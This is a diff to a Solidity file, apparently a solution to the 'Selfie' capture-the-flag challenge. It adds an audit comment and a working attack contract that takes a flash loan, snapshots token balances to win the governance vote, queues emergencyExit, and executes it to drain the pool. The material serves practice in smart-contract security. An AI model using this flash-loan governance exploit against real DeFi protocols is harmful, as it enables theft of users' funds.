@@ -73,3 +73,54 @@ contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
         emit FundsDrained(receiver, amount);
     }
 }
+
+// @audit 
+// a) Need to call SelfiePool.emergencyExit() to drain pool, but this can
+// only be called from governance address.
+//
+// b) SimpleGovernance._hasEnoughVotes() passes if at the last snapshot we
+// had more than half the token supply.
+//
+// c) Token created with 2M supply, 1.5M given to pool & available for flash loan.
+//
+// Attack:
+//
+// 1) Take flash loan for 1.5M & call DamnValuableTokenSnapshot.snapshot()
+//
+// 2) Call SimpleGovernance.queueAction() to propose SelfiePool.emergencyExit()
+//
+// 3) Wait 2 days to bypass check in SimpleGovernance._canBeExecuted()
+//
+// 4) Call SimpleGovernance.executeAction() to execute proposed action
+//
+contract SelfiePoolAttack is IERC3156FlashBorrower {
+    SelfiePool selfiePool;
+    uint256 actionId;
+
+    function attack(address payable _selfiePool, uint256 _loanAmount) external {
+        selfiePool = SelfiePool(_selfiePool);
+
+        // before getting flashLoan, approve SelfiePool as spender for token loanAmount
+        // as it attempts to transfer tokens back to itself at end of SelfiePool.flashLoan()
+        selfiePool.token().approve(_selfiePool, _loanAmount);
+        selfiePool.flashLoan(this, address(selfiePool.token()), _loanAmount, "");
+
+        actionId = selfiePool.governance().queueAction(
+                        _selfiePool, 
+                        0, 
+                        abi.encodeWithSignature("emergencyExit(address)", msg.sender));
+    }
+
+    function completeAttack() external {
+        selfiePool.governance().executeAction(actionId);
+    }
+
+    // @dev implement IERC3156FlashBorrower.onFlashLoan()
+    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC3156FlashBorrower.sol
+    function onFlashLoan(address,address,uint256,uint256,bytes calldata) external returns (bytes32) {
+        DamnValuableTokenSnapshot(address(selfiePool.token())).snapshot();
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    receive() external payable {}
+}
